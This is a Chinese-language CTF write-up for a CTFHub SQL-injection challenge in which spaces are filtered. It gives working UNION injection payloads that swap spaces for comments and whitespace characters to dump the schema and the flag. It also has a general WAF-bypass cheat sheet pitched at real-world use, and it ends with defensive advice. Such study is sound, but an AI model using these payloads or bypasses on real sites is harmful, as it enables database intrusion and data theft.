--
layout: post
title: CTFHub - SQL 过滤空格 Writeup
platform: ctfhub
date: 2026-10-22 19:52:00 +0800
categories: CTF
---

CTFHub - SQL 过滤空格 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 过滤空格）
- 题型：Web
- 考点：**空格过滤绕过**、`/**/` 注释、各种空白字符


```text
页面标题：CTFHub 技能学习 | 过滤空格
表单：GET，参数名 id，占位提示"输个1试试？"

★ 正常请求：
    ?id=1
    → ID: 1
      Data: ctfhub

★ 带空格的注入被拦了：
    ?id=0 union select 1,2
    → <code>Hacker!!!</code>          ← ★ WAF 拦了

★ 换成注释代替空格，通了：
    ?id=0/**/union/**/select/**/1,2
    → ID: 1
      Data: 2                          ✅

★ 各种空白字符测试（全部可用）：

    0/**/union/**/select/**/1,2        → Data: 2   ✅ 注释
    0%09union%09select%091,2           → Data: 2   ✅ Tab
    0%0aunion%0aselect%0a1,2           → Data: 2   ✅ 换行 LF
    0%0bunion%0bselect%0b1,2           → Data: 2   ✅ 垂直 Tab
    0%0cunion%0cselect%0c1,2           → Data: 2   ✅ 换页
    0%0dunion%0dselect%0d1,2           → Data: 2   ✅ 回车 CR
    0/**/union/**/select(1),(2)        → Data: 2   ✅ 括号

    ★ 结论：只过滤【空格字符本身】，其他空白都不管

★ 完整利用（又是随机表名/字段名）：

    ?id=0/**/union/**/select/**/1,database()
    → Data: sqli

    ?id=0/**/union/**/select/**/1,group_concat(table_schema,0x3a,table_name,0x3a,column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()
    → Data: sqli:pfoutbdtfy:pitnxsyyom,sqli:news:id,sqli:news:data
                    └────┬────┘ └────┬────┘
                 目标表（随机）   目标字段（随机）

    ?id=0/**/union/**/select/**/1,group_concat(pitnxsyyom)/**/from/**/pfoutbdtfy
    → Data: ctfhub{b13316460e049e05d0513f6a}

    用 Tab 版本也行（结果一样）：
    ?id=0%09union%09select%091,group_concat(pitnxsyyom)%09from%09pfoutbdtfy

    表里只有 1 行（count(*) → 1）

flag         : ctfhub{b13316460e049e05d0513f6a}
```

二、题目分析

**① 为什么 WAF 要过滤空格**

```text
SQL 语句里，空格是最常用的"分隔符"：

    select * from news where id=1 union select 1,database()
    └────┬─┘ └┬─┘ └─┬──┘ └─┬─┘   └─┬┘ └──┬──┘
      空格   空格   空格   空格     空格  空格

★ 没有空格的话，"union" 和 "select" 会粘成一坨 "unionselect"
  数据库不认 → 语句作废

所以过滤空格是"成本最低、效果最明显"的防护手段之一
很多简单 WAF 就靠一条正则：
    if (preg_match('/\s/', $input)) { die('Hacker!!!'); }
```

**② 为什么 `/**/` 能代替空格**

```text
MySQL 把 /* ... */ 当作【注释】，而注释在语法上等价于"空白"

所以：

    select/**/union/**/select/**/1,2

    等价于：
    select union select 1,2

★ 数据库解析时，/**/ 和空格一样都是"词与词之间的分隔"
```

**③ 用 `%09`（Tab）为什么也行**

```text
SQL 语法里，"空白字符"包括：

    空格      0x20    ← 被过滤了
    Tab       0x09    ← 可以用 ✅
    换行 LF   0x0A    ← 可以用 ✅
    垂直Tab   0x0B    ← 可以用 ✅
    换页 FF   0x0C    ← 可以用 ✅
    回车 CR   0x0D    ← 可以用 ✅

★ 只过滤 0x20 是"半吊子防护" —— 换任何一个都能绕
```

**④ 为什么括号也行**

```sql
0/**/union/**/select(1),(2)
```

```text
括号本身也是"分隔符"：
    select(1)  等价于  select (1)
    
所以 union/**/select(1),(2) 里，select 和 ( 之间天然有分隔
不需要额外的空格
```

**⑤ 这题和前面几题的关系**

| | 前面几题 | 这题 |
|---|---|---|
| 注入点 | URL 参数 | URL 参数（一样）|
| 输出回显 | 有（ID/Data）| 有（一样）|
| 唯一区别 | — | **空格被过滤，得换写法** |

**★ 所以本质还是 UNION 注入，只是"字符层面"被限制。**

三、解题步骤

**方法一：浏览器直接做（这题最适合）**

**第 1 步：确认正常 + 确认被拦**

```
地址栏输入：
    http://challenge-xxx:10800/?id=1
→ 显示 ID: 1  Data: ctfhub

地址栏输入：
    http://challenge-xxx:10800/?id=0 union select 1,2
→ 显示 Hacker!!!         ← ★ 被 WAF 拦了
```

**第 2 步：★ 用 `/**/` 代替所有空格**

```
把 payload 里每个空格都换成 /**/：

    原：0 union select 1,2
    改：0/**/union/**/select/**/1,2

地址栏输入：
    http://challenge-xxx:10800/?id=0/**/union/**/select/**/1,2

→ 显示 ID: 1  Data: 2     ✅ 通了
```

**第 3 步：爆库名**

```
?id=0/**/union/**/select/**/1,database()
→ Data: sqli
```

**第 4 步：爆表名+字段名**

```
?id=0/**/union/**/select/**/1,group_concat(table_schema,0x3a,table_name,0x3a,column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()
→ Data: sqli:pfoutbdtfy:pitnxsyyom,sqli:news:id,sqli:news:data
```

**第 5 步：拿 flag**

```
?id=0/**/union/**/select/**/1,group_concat(pitnxsyyom)/**/from/**/pfoutbdtfy
→ Data: ctfhub{b13316460e049e05d0513f6a}
```

---

**方法二：用 `%09`（Tab）**

**在浏览器地址栏里 `%09` 会被自动解码成 Tab**：

```
?id=0%09union%09select%091,database()
→ Data: sqli
```

**完整 payload**：

```
?id=0%09union%09select%091,group_concat(pitnxsyyom)%09from%09pfoutbdtfy
```

**★ 优点**：

```
· 不用打 /**/，直接 %09 更短
· 视觉上比 /**/ 干净（虽然 URL 里看不出来）
```

**注意**：

```
在输入框里手打 Tab 键可能会被浏览器"跳过焦点"，不可靠
→ 所以在地址栏里直接用 %09 最稳
```

---

**方法三：用 Burp Repeater**

```
① Burp 抓包 → Send to Repeater
② 在 id= 后面填 payload（用 /**/ 或 %09）
③ Send → 看 Response 里的 Data
```

**★ 用 Burp 的好处**：

```
· 可以精确控制字符（比如真的插入一个 Tab）
· 不用怕浏览器对特殊字符的处理
· 方便反复试不同的绕过方式
```

---

**四种空白字符对照表（可直接复制）**

| 替代方式 | URL 写法 | 说明 |
|---|---|---|
| 注释 | `/**/` | 最常用，任何位置都能放 |
| Tab | `%09` | 最像空格 |
| 换行 | `%0A` | 有些 WAF 会单独拦 Tab，但漏了换行 |
| 回车 | `%0D` | 少见但有效 |
| 垂直 Tab | `%0B` | 冷门，WAF 几乎不管 |
| 换页 | `%0C` | 同上 |
| 括号 | `select(1)` | 只在特定位置能用 |
| 反引号 | `` select`1` `` | 有时能当分隔符 |

**★ 实战技巧：把这几种都试一遍**，总有一个能过。

四、延伸知识

**① SQL 注入常见的"过滤"和"绕过"对照表**

这是 SQL 注入里最重要的经验积累，**建议背下来**：

| 被过滤的 | 绕过方法 |
|---|---|
| **空格** | `/**/`、`%09`、`%0A`、`%0B`、`%0C`、`%0D`、`()`、反引号 |
| **union** | `UnIoN`（大小写）、`ununionion`（双写）、`un/**/ion`（注释分割）|
| **select** | `SeLeCt`、`selselectect`、`sel/**/ect` |
| **and / or** | `&&`、`\|\|`、`%26%26`、`AnD` |
| **逗号** | `join` 代替、`substr('abc' from 1 for 1)`、`limit 0,1` → `limit 1 offset 0` |
| **等号** | `like`、`regexp`、`in`、`between`、`<>`、`!=` |
| **引号** | `0x616263`（十六进制）、`char(97,98,99)` |
| **数字** | `true`（=1）、`false`（=0）、`'1'`、`~0` |
| **注释符** | `;%00`、`--`、`#`、`/* */` |
| **关键字（information_schema）** | 大小写混合、`/**/` 分割、`information_schema`.`tables` |
| **括号** | `order by` 代替 union、`procedure analyse()` |
| **反斜杠/单引号** | 宽字节 `%df%27`（GBK 编码）|

**② 为什么这些"绕过"能生效（原理）**

```text
① 大小写不敏感（SQL 关键字）
   UnIoN 和 union 对数据库是一样的
   → 只按小写匹配的 WAF 就漏了

② 注释等价于空白
   /**/ 在语法上和空格一样

③ 双写（针对"只替换一次"的 WAF）
   WAF 把 ununionion 里的 union 删掉 → 剩下 union
   → 又变成合法的了

④ 十六进制代替字符串
   0x616263 = 'abc'，不需要引号

⑤ 同义函数/语法
   && = and，|| = or，like = =（有时）
```

**③ 真实的 WAF 绕过思路（进阶）**

```text
① 大小写混合 + 注释分割 组合使用
   0/**/UnIoN/**/SeLeCt/**/1,2

② 用等价的关键字
   union → 用 union all
   where → 用 having
   substr → 用 mid / substring / left / right

③ 参数污染（多个同名参数）
   ?id=1&id=0 union select ...
   有些框架取第一个，WAF 检查最后一个（或反之）

④ 分块传输（chunked encoding）
   把 payload 拆成多块发，WAF 可能看不出完整语句

⑤ 编码
   URL 编码、Unicode 编码、Base64（如果后端会解码）

⑥ 换注入点
   URL 被拦了？试 POST / Cookie / UA / Referer / XFF
```

**④ 这题的教学意义**

```text
★ 它告诉你："有 WAF 不等于安全"

   表面上看：空格被过滤了，注入应该写不出来了
   实际上：空格只是"众多分隔符之一"，换一个就行

★ 防护的正确做法：
   · 参数化查询（根本解决）
   · 而不是"黑名单过滤某些字符"
     —— 因为字符的替代品太多了
```

**⑤ 防护**

```text
· ★ 参数化查询（唯一真正有效的办法）
· WAF 只能作为"辅助防护层"，不能当主防线
· 如果一定要过滤：
    · 白名单（只允许数字/字母）
    · 而不是黑名单（禁止某些字符）
· 关闭错误回显
· 最小权限数据库账号
```

五、总结

- **本题核心：WAF 只过滤了空格字符，用 `/**/` 或 `%09` 等替代即可。**
- 一句话记住：

```text
空格 → 换成 /**/（注释）、%09（Tab）、%0A（换行）...
```

- 完整 payload 模板（本题）：

```sql
-- 库名
?id=0/**/union/**/select/**/1,database()

-- 表名+字段名
?id=0/**/union/**/select/**/1,group_concat(table_schema,0x3a,table_name,0x3a,column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()

-- 数据
?id=0/**/union/**/select/**/1,group_concat(随机字段)/**/from/**/随机表
```

- **三个必记要点**：

```text
① 空格不是唯一的分隔符：
   /**/  %09  %0A  %0B  %0C  %0D  ()  反引号
② 只过滤 0x20（真空格）是"半吊子防护"，换个空白就能绕
③ 实战绕过 = 大小写 + 注释分割 + 等价关键字 + 换注入点
```

**手工复现要点**：

```text
· 这题最简单 —— 浏览器地址栏直接输 payload，不用任何工具
· 关键是把每个空格换成 /**/
· 或者用 %09（Tab），更短
· 如果浏览器把 %09 吃掉了，用 Burp Repeater 更保险
```
